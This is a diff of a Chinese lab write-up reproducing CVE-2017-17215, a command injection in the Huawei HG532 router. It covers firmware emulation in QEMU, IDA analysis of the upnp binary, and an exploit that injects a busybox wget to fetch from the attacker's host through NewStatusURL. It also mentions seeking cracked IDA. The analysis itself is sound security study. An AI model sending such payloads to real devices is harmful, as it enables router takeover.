@@ -82,11 +82,15 @@
   
   <img src="./img/findupnp.png">
 
-- `file upnp`的结果，upnp是MIPS 32位 大端架构系统
+- `file upnp`的结果，upnp是MIPS 32位 大端架构系统，根据ELF文件格式，使用相应的qemu进行模拟
 
   ```bash
   ~/_HG532eV100R001C01B020_upgrade_packet.bin.extracted/squashfs-root/bin$ file upnp
   upnp: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, corrupted section header size
+
+  # mips 32位大端字节序
+  # mipsel 是32位小端字节序
+  # mips64el 是64位小端字节序
   ```
 
 ### Environment
@@ -104,6 +108,9 @@
 $ sudo apt-get install qemu 
 $ sudo apt-get install qemu-user-static
 $ sudo apt-get install qemu-system
+
+$ qemu-img --version
+qemu-img version 2.5.0 (Debian 1:2.5+dfsg-5ubuntu10.44), Copyright (c) 2004-2008 Fabrice Bellard
 ```
 
 #### 配置网络环境
@@ -236,7 +243,7 @@ $ sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_
 
 <img src="./img/payload.png">
 
-注意其中的关键字：ctrlt和DeviceUpgrade_1，通过*grep -r [keywords]指令查看有哪些文件包含这两个词语，再找下端口号37215所在文件分别是`bin/upnp`和`bin/mic`
+注意其中的关键字：ctrlt和DeviceUpgrade_1，通过*grep -r [keywords]指令查看有哪些文件包含这两个词语，再找下端口号37215，所在文件分别是`bin/upnp`和`bin/mic`
 
 <img src="./img/find.png">
 
@@ -251,6 +258,8 @@ $ chroot . sh
 # /upnp
 # /mic
 ```
+
+端口号只出现在mic文件内，所以猜测是mic启动的upnp服务，直接运行mic命令
 
 <img src="./img/mic.png">
 
@@ -288,13 +297,54 @@ data = '''<?xml version="1.0" ?>
 requests.post('http://192.168.83.17:37215/ctrlt/DeviceUpgrade_1',headers=headers,data=data)
 ```
 
-监听发现80端口收到路由器发来的wget包（在ubantu上键入指令sudo nc -vlp 80 监听本机80端口），说明路由器成功执行exp中的wget指令
+监听发现80端口(sudo nc -vlp 80 )收到路由器发来的wget包，试图获取文件1(我没创建)，说明路由器成功执行exp中的wget指令
 
 <img src="./img/wget.png">
 
 #### 漏洞原理
 
+[IDA下载](https://www.hex-rays.com/products/ida/support/download_freeware/) - 在Ubuntu 16.0 LTS Desktop上会报错`The processor type 'mipsb' is not included in the installed version of IDA.` > 完犊子了，是因为要购买正版才能有完整功能，所以找破解软件
+- https://www.cnblogs.com/ryuasuka/p/5493371.html
+- https://blog.csdn.net/lgdx2017/article/details/80408524
 
+用IDA打开固件文件中的squashfs-root/bin/upnp文件。根据poc，注入点在`NewStatusURL`以及`NewDownloadURL`，在字符串中找到它们
+- `views` > `open subviews` > `ctrl + f` 搜索字符
+  
+  <img src="./img/findstring.png">
+
+双击NewStatusURL，转到汇编代码
+
+<img src="./img/newstatusurl.png">
+
+按下X（ctrl+x）查看交叉引用
+
+<img src="./img/xrefs.png">
+
+
+
+<img src="./img/snprintf.png">
+
+- 程序通过ATP_XML_GetChildNodeByName函数获取xml中的NewStatusURL节点，并且未经过检查就直接与upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -拼接使用system函数进行执行
+    ```
+    snprintf(a0,0x400,"upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -",a3)
+
+    其中a0是拷贝的源字符串的地址，同时a0又是system调用的第一个参数，所以最后会执行`system(a0)`，以达到控制该路由器的目的
+
+    实现了"任意OS命令注入，a0可控"的漏洞
+    ```
+- 漏洞的原理
+  - 首先在**NewStatusURL**输入单引号将前面的字符串闭合，然后再注入相应的执行命令即可
+  - 如需要执行ls命令，则需要做的就是构造`<NewStatusURL>';ls;</NewStatusURL>`节点即可。该节点字符串与`upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -`拼接得到`upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r ';ls; -d -`，然后执行system调用，实现注入
+  - 例如在本文的exp中，执行的是wget指令
+    ```
+    根据上面payload图，newstatusurl这个节点值为  <NewStatusURL>;/bin/busybox wget -g 192.168.83.19 -l /tmp/1 -r /1;</NewStatusURL>
+    ```
+
+#### 参考资料
+
+- [【我的第一个现实漏洞分析】 CVE-2017-17215 华为智能路由器HG532 漏洞分析笔记](https://www.jianshu.com/p/c6d238d4508b)
+- [通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃](https://www.freebuf.com/vuls/160040.html)
+- [CVE-2017-17215-HG532命令注入漏洞分析](https://xz.aliyun.com/t/4819)
 
 ### BooFuzz
 
@@ -304,4 +354,3 @@ requests.post('http://192.168.83.17:37215/ctrlt/DeviceUpgrade_1',headers=headers
 - https://github.com/jtpereyda/boofuzz
 - 配置桥接网络的资料
   - https://blog.csdn.net/u010817321/article/details/52117344
-  - 
